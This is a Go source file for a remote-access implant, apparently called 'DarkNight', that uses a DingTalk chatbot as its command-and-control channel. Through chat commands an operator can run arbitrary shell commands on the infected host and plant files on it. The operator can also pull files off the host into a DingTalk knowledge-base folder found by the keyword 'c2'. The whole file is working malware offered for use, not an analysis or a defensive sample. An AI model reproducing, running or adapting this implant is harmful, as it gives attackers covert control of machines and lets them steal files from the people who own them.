package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	openapi "github.com/alibabacloud-go/darabonba-openapi/v2/client"
	dingtalkrobot_1_0 "github.com/alibabacloud-go/dingtalk/robot_1_0"
	dingtalkstorage_2_0 "github.com/alibabacloud-go/dingtalk/storage_2_0"
	util "github.com/alibabacloud-go/tea-utils/v2/service"
	"github.com/alibabacloud-go/tea/tea"
	"github.com/open-dingtalk/dingtalk-stream-sdk-go/chatbot"
	"github.com/open-dingtalk/dingtalk-stream-sdk-go/client"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
)

func help() string {
	return fmt.Sprintf("Welcome to the DarkNight!\n" +
		" - help : show this help menu\n" +
		" - pwd : print working directory\n" +
		" - whoami : get username\n" +
		" - cmd <command> : execute command\n" +
		" - <upload(No Command)> : Send the file directly to the bot, and the file will be downloaded to the current working directory\n" +
		" - download <remote_file_name> : download remote_file of dingding-implant to the folder of dingding knowledge base\n" +
		" - exit : kill the connection with the dingding-implant")
}

// 获取当前工作目录
func pwd() string {
	dir, err := os.Getwd()
	if err != nil {
		return fmt.Sprintf("Failed in GetCurrentDirectory: %v", err)
	}
	return dir
}

// 获取计算机名称和用户名称
func whoami() string {
	var cmd *exec.Cmd
	switch runtime.GOOS {
	case "windows":
		// Windows 系统，使用 cmd.exe /C
		cmd = exec.Command("cmd.exe", "/C", "whoami")
	case "linux", "darwin":
		cmd = exec.Command("sh", "-c", "whoami")
	default:
		return "Unsupported OS"

	}
	username, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Failed to execute command: %v", err)
	}
	return string(username)
}

// 执行 shell 命令
func shell(command string) string {
	var cmd *exec.Cmd

	// 检查操作系统并选择对应的命令执行方式
	switch runtime.GOOS {
	case "windows":
		// Windows 系统，使用 cmd.exe /C
		cmd = exec.Command("cmd.exe", "/C", command)
	case "linux", "darwin": // darwin 是 macOS 的 GOOS 名
		// Linux 和 macOS 系统，使用 sh -c
		cmd = exec.Command("sh", "-c", command)
	default:
		return "Unsupported OS"
	}

	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Failed to execute command: %v", err)
	}
	return string(out)
}

func get_access_token() (string, error) {
	access_token_url := "https://api.dingtalk.com/v1.0/oauth2/accessToken"
	requestBody := map[string]string{
		"appKey":    client_id,
		"appSecret": client_secret,
	}
	jsonData, err := json.Marshal(requestBody)
	if err != nil {
		return "", fmt.Errorf("Error encoding JSON: %s\n", err)
	}
	req, err := http.NewRequest("POST", access_token_url, bytes.NewBuffer(jsonData))
	if err != nil {
		return "", fmt.Errorf("Error creating request: %s\n", err)
	}
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf("Error sending request: %s\n", err)
	}
	defer resp.Body.Close()
	var responseBody map[string]string
	body, _ := ioutil.ReadAll(resp.Body)
	err = json.Unmarshal(body, &responseBody)
	access_token = responseBody["accessToken"]

	return access_token, nil
}

/**
 * 使用 Token 初始化账号Client
 * @return Client
 * @throws Exception
 */
func CreateClient() (_result *dingtalkrobot_1_0.Client, _err error) {
	config := &openapi.Config{}
	config.Protocol = tea.String("https")
	config.RegionId = tea.String("central")
	_result = &dingtalkrobot_1_0.Client{}
	_result, _err = dingtalkrobot_1_0.NewClient(config)
	return _result, _err
}
func CreateClient20() (_result *dingtalkstorage_2_0.Client, _err error) {
	config := &openapi.Config{}
	config.Protocol = tea.String("https")
	config.RegionId = tea.String("central")
	_result = &dingtalkstorage_2_0.Client{}
	_result, _err = dingtalkstorage_2_0.NewClient(config)
	return _result, _err
}

func download_file_to_implant(download_url string, file_name string) error {
	// 创建HTTP请求
	req, _ := http.NewRequest("GET", download_url, nil)
	// 发送请求
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("Error sending request: %s\n", err)
	}
	defer resp.Body.Close()
	// 读取响应体
	body, _ := ioutil.ReadAll(resp.Body)
	// 保存到当前目录
	localFileName := filepath.Base(file_name)
	if err := ioutil.WriteFile(localFileName, body, 0644); err != nil {
		return fmt.Errorf("write file error: %v", err)
	}

	return nil
}

func get_download_url(downloadCode string) (string, error) {
	client, _err := CreateClient()
	if _err != nil {
		return "", _err
	}

	robotMessageFileDownloadHeaders := &dingtalkrobot_1_0.RobotMessageFileDownloadHeaders{}
	robotMessageFileDownloadHeaders.XAcsDingtalkAccessToken = tea.String(access_token)
	robotMessageFileDownloadRequest := &dingtalkrobot_1_0.RobotMessageFileDownloadRequest{
		DownloadCode: tea.String(downloadCode),
		RobotCode:    tea.String(robot_code),
	}
	result, tryErr := func() (result *dingtalkrobot_1_0.RobotMessageFileDownloadResponse, _e error) {
		defer func() {
			if r := tea.Recover(recover()); r != nil {
				_e = r
			}
		}()
		result, _err := client.RobotMessageFileDownloadWithOptions(robotMessageFileDownloadRequest, robotMessageFileDownloadHeaders, &util.RuntimeOptions{})
		if _err != nil {
			return nil, _err
		}

		return result, nil
	}()

	if tryErr != nil {
		var err = &tea.SDKError{}
		if _t, ok := tryErr.(*tea.SDKError); ok {
			err = _t
		} else {
			err.Message = tea.String(tryErr.Error())
		}
		if !tea.BoolValue(util.Empty(err.Code)) && !tea.BoolValue(util.Empty(err.Message)) {
			// err 中含有 code 和 message 属性，可帮助开发定位问题
		}
		return "", _err
	}
	download_url := *result.Body.DownloadUrl

	return download_url, nil
}

func get_user_union_id() (string, error) {
	get_user_union_id_url := fmt.Sprintf("https://oapi.dingtalk.com/topapi/v2/user/get?access_token=%s", access_token)
	// 创建请求体的JSON数据
	requestBody := map[string]string{
		"userid": user_id,
	}
	// 将请求体编码为JSON
	jsonData, err := json.Marshal(requestBody)
	if err != nil {
		return "", fmt.Errorf("Error encoding JSON: %s\n", err)
	}

	// 创建HTTP请求
	req, err := http.NewRequest("POST", get_user_union_id_url, bytes.NewBuffer(jsonData))
	if err != nil {
		return "", fmt.Errorf("Error creating request: %s\n", err)
	}

	// 设置请求头，指定内容类型为JSON
	req.Header.Set("Content-Type", "application/json")

	// 发送请求
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf("Error sending request: %s\n", err)
	}
	defer resp.Body.Close()

	// 读取响应体
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf("Error reading response: %s\n", err)
	}

	// 解析响应体中的JSON数据
	var responseBody map[string]interface{}
	var result map[string]interface{}
	err = json.Unmarshal(body, &responseBody)
	if err != nil {
		return "", fmt.Errorf("Error decoding JSON: %s\n", err)
	}
	//fmt.Println(responseBody)
	result, _ = responseBody["result"].(map[string]interface{})
	unionId, _ = result["unionid"].(string)
	return unionId, nil
}

func get_dentry_uuid_and_headers() error {
	client, _err := CreateClient20()
	if _err != nil {
		return _err
	}
	searchDentriesHeaders := &dingtalkstorage_2_0.SearchDentriesHeaders{}
	searchDentriesHeaders.XAcsDingtalkAccessToken = tea.String(access_token)
	//optionVisitTimeRange := &dingtalkstorage_2_0.SearchDentriesRequestOptionVisitTimeRange{}
	//optionCreateTimeRange := &dingtalkstorage_2_0.SearchDentriesRequestOptionCreateTimeRange{}
	option := &dingtalkstorage_2_0.SearchDentriesRequestOption{
		//NextToken:        tea.String(""),
		MaxResults: tea.Int32(10),
		//DentryCategories: []*string{tea.String("")},
		//CreatorIds:       []*string{tea.String("")},
		//ModifierIds:      []*string{tea.String("")},
		//CreateTimeRange:  optionCreateTimeRange,
		//VisitTimeRange:   optionVisitTimeRange,
	}
	searchDentriesRequest := &dingtalkstorage_2_0.SearchDentriesRequest{
		OperatorId: tea.String(unionId),
		Keyword:    tea.String("c2"),
		Option:     option,
	}
	var response *dingtalkstorage_2_0.SearchDentriesResponse
	response, err := client.SearchDentriesWithOptions(searchDentriesRequest, searchDentriesHeaders, &util.RuntimeOptions{})
	//fmt.Println(response.Body)
	dentry_id = *response.Body.Items[0].DentryUuid
	//fmt.Println(dentry_id)
	//fmt.Println(err)

	return err
}

func get_information_of_upload_file() error {
	client, _err := CreateClient20()
	if _err != nil {
		return _err
	}
	getFileUploadInfoHeaders := &dingtalkstorage_2_0.GetFileUploadInfoHeaders{}
	getFileUploadInfoHeaders.XAcsDingtalkAccessToken = tea.String(access_token)
	//optionPreCheckParam := &dingtalkstorage_2_0.GetFileUploadInfoRequestOptionPreCheckParam{
	//	Size: tea.Int64(512),
	//	Name: tea.String("name"),
	//}
	option := &dingtalkstorage_2_0.GetFileUploadInfoRequestOption{
		StorageDriver: tea.String("DINGTALK"),
		//PreCheckParam: optionPreCheckParam,
		PreferRegion: tea.String("SHENZHEN"),
		//PreferIntranet: tea.Bool(true),
	}
	getFileUploadInfoRequest := &dingtalkstorage_2_0.GetFileUploadInfoRequest{
		UnionId:  tea.String(unionId),
		Protocol: tea.String("HEADER_SIGNATURE"),
		Option:   option,
	}
	result, err := client.GetFileUploadInfoWithOptions(tea.String(dentry_id), getFileUploadInfoRequest, getFileUploadInfoHeaders, &util.RuntimeOptions{})
	resource_urls = result.Body.HeaderSignatureInfo.ResourceUrls
	upload_headers = result.Body.HeaderSignatureInfo.Headers
	upload_key = result.Body.UploadKey

	//fmt.Println(err)

	return err
}

func upload_file_to_resource_urls(filename string) error {
	resource_url := *resource_urls[0]
	// 打开文件
	filePath := filename
	fileData, err := ioutil.ReadFile(filePath)
	if err != nil {
		return fmt.Errorf("Error reading file: %s\n", err)
	}
	// 创建请求
	request, err := http.NewRequest("PUT", resource_url, bytes.NewBuffer(fileData))
	if err != nil {
		return fmt.Errorf("Error creating request: %s\n", err)
	}
	// 设置headers
	for key, value := range upload_headers {
		request.Header.Set(key, *value)
	}
	// 发送请求
	client := &http.Client{}
	response, err := client.Do(request)
	if err != nil {
		return fmt.Errorf("Error sending request: %s\n", err)
	}
	defer response.Body.Close()
	//fmt.Println(err)
	//fmt.Println(response.StatusCode)
	return nil
}

func real_upload_file(filename string) error {
	client, _err := CreateClient20()
	if _err != nil {
		return _err
	}
	commitFileHeaders := &dingtalkstorage_2_0.CommitFileHeaders{}
	commitFileHeaders.XAcsDingtalkAccessToken = tea.String(access_token)
	//optionAppProperties0 := &dingtalkstorage_2_0.CommitFileRequestOptionAppProperties{
	//	Name:       tea.String("property_name"),
	//	Value:      tea.String("property_value"),
	//	Visibility: tea.String("PRIVATE"),
	//}
	option := &dingtalkstorage_2_0.CommitFileRequestOption{
		//	Size:               tea.Int64(512),
		ConflictStrategy: tea.String("AUTO_RENAME"),
		//	AppProperties:      []*dingtalkstorage_2_0.CommitFileRequestOptionAppProperties{optionAppProperties0},
		//	ConvertToOnlineDoc: tea.Bool(false),
	}
	commitFileRequest := &dingtalkstorage_2_0.CommitFileRequest{
		UnionId:   tea.String(unionId),
		UploadKey: tea.String(*upload_key),
		Name:      tea.String(filename),
		Option:    option,
	}
	_, _err = client.CommitFileWithOptions(tea.String(dentry_id), commitFileRequest, commitFileHeaders, &util.RuntimeOptions{})
	//fmt.Println(result)
	//fmt.Println(_err)

	return _err
}

// 定义一个结构体，字段名对应map中的键
type FileData struct {
	DownloadCode interface{} `json:"downloadCode"`
	FileId       interface{} `json:"fileId"`
	FileName     interface{} `json:"fileName"`
	SpaceId      interface{} `json:"spaceId"`
}

func OnChatBotMessageReceived(ctx context.Context, data *chatbot.BotCallbackDataModel) ([]byte, error) {
	//replyMsg := []byte(fmt.Sprintf("echo received message: [%s]", strings.TrimSpace(data.Text.Content)))
	//fmt.Println(data)
	replyMsg := []byte(help())
	replier := chatbot.NewChatbotReplier()

	if data.Msgtype == "text" {
		receive_command := strings.TrimSpace(data.Text.Content)
		if receive_command == "exit" {
			replyMsg = []byte(" [*] goodbye, my friend, see you next time")
			replier = chatbot.NewChatbotReplier()
			if err := replier.SimpleReplyText(ctx, data.SessionWebhook, replyMsg); err != nil {
				return nil, err
			}
			os.Exit(0)
		} else if receive_command == "help" {
			replyMsg = []byte(help())
		} else if receive_command == "pwd" {
			replyMsg = []byte(fmt.Sprintf(" [+] `%s` Result:\n%s", receive_command, pwd()))
		} else if receive_command == "whoami" {
			replyMsg = []byte(fmt.Sprintf(" [+] `%s` Result:\n%s", receive_command, whoami()))
		} else if strings.HasPrefix(receive_command, "cmd") {
			command := strings.TrimPrefix(receive_command, "cmd ")
			replyMsg = []byte(fmt.Sprintf(" [+] `%s` Result:\n%s", receive_command, shell(command)))
		} else if strings.HasPrefix(receive_command, "download") {
			get_dentry_uuid_and_headers()
			fmt.Println(dentry_id)
			get_information_of_upload_file()
			fmt.Println(upload_headers)
			fmt.Println(resource_urls)
			fmt.Println(upload_key)
			filename := strings.TrimPrefix(receive_command, "download ")
			err := upload_file_to_resource_urls(filename)
			//fmt.Println(err)
			err = real_upload_file(filename)

			if err == nil {
				replyMsg = []byte(fmt.Sprintf(" [+] `%s` download success!", filename))
			} else {
				replyMsg = []byte(fmt.Sprintf(" [-] `%s` download failed!", filename))
			}

		}
	} else if data.Msgtype == "file" {
		// 类型断言将data.Content转换为map[string]interface{}
		contentMap, _ := data.Content.(map[string]interface{})
		//fmt.Println(data.Content)
		downloadCode := contentMap["downloadCode"].(string)
		//fmt.Println(downloadCode)
		fileName := contentMap["fileName"].(string)
		//fmt.Println(fileName)
		//replier.ReplyMessage()
		download_url, _ := get_download_url(downloadCode)
		//fmt.Println(download_url)
		err := download_file_to_implant(download_url, fileName)
		if err == nil {
			replyMsg = []byte(fmt.Sprintf(" [+] `%s` has been uploaded to the current path of implant\n", fileName))
		} else {
			replyMsg = []byte(fmt.Sprintf(" [-] `%s` uploaded failed\n", fileName))
		}

	}

	if err := replier.SimpleReplyText(ctx, data.SessionWebhook, replyMsg); err != nil {
		return nil, err
	}

	return []byte(""), nil
}

var client_id string
var client_secret string
var robot_code string
var user_id string
var access_token string
var unionId string
var dentry_id string
var upload_headers map[string]*string
var resource_urls []*string
var upload_key *string

func main() {
	fmt.Println("Welcome to the DarkNight!")
	if len(os.Args) < 4 {
		fmt.Println("Usage: implant <client_id> <client_secret> <robot_code> <user_id>")
		return
	}
	//webhook_key := os.Args[1]
	//webhook_url := fmt.Sprintf("https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=%s", webhook_key)
	client_id = os.Args[1]
	client_secret = os.Args[2]
	robot_code = os.Args[3]
	user_id = os.Args[4]

	//启动！
	get_access_token()
	fmt.Println(access_token)
	get_user_union_id()
	fmt.Println(unionId)
	//get_dentry_uuid_and_headers()
	//fmt.Println(dentry_id)
	//get_information_of_upload_file()
	//fmt.Println(upload_headers)
	//fmt.Println(resource_urls)

	cli := client.NewStreamClient(client.WithAppCredential(client.NewAppCredentialConfig(client_id, client_secret)))
	cli.RegisterChatBotCallbackRouter(OnChatBotMessageReceived)
	err := cli.Start(context.Background())
	if err != nil {
		panic(err)
	}
	//确保cli在main函数结束后关闭
	defer cli.Close()
	//永久阻塞
	select {}
}
